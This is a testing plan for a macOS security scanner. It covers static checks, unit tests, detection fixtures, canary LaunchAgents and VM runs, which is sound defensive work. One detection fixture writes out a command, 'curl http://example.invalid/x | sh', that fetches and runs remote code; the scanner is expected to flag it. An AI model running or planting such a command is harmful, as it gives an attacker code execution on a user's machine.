# Testing

## Tools (install once, Tier 1)
`brew install shellcheck shfmt bats-core`

## Layers
1. **Static:** `shellcheck -s bash` on every script (the installer, and later every file in `src/`). Zero warnings, or a commented `# shellcheck disable=` with a reason.
2. **Unit (bats):** functions in `common.sh`, for example `redact` (keys, tokens, JWTs, URL credentials are masked; normal text untouched), `is_dev_path`, `is_self`, `sig` on a signed and an unsigned binary.
3. **Module smoke tests:** run a module as the user with a fake environment: `UH`, `RUN`, `INV`, `OUTBASE`, `U`, `UID_N`, `DAYS` pointing at a temporary fixture home. Assert it exits 0, stays within its timeout, and writes nothing outside `$RUN`, `$INV` and its temp files.
4. **Detection tests with fixtures** (no real malware):
   - A fixture `.zshrc` containing `curl http://example.invalid/x | sh` must produce a module 07 flag.
   - A fixture `.vscode/tasks.json` with `"runOn": "folderOpen"` must produce a module 17 flag.
   - A synthetic, non-executable text file containing the custom YARA traits must match `MacTriage_JS_GlobalRequire_Loader`, and clean JavaScript must not.
   - The EICAR test string must be detected by ClamAV.
5. **Canary tests (real system, Tier 1, user runs):** install a harmless LaunchAgent with label `test.canary.macscan` that runs `/usr/bin/true`, run `macscan --only 05`, confirm it is reported and appears under "new since last scan", then remove it. Do not use the `com.mactriage.` prefix; the scanner ignores its own labels.
6. **Full run in a VM:** a macOS guest in UTM on this Mac for installer, upgrade, uninstall and schedule tests, so testing never risks the real system.
7. **Performance:** record per-module duration from the scan log; flag any module that grows more than 50 percent between versions.

## Real malware samples
Never copy, run, or keep real malware in this repo. The one real sample (the JS loader from the incident) may only be scanned in place, read-only, with YARA as the user, to validate rules.
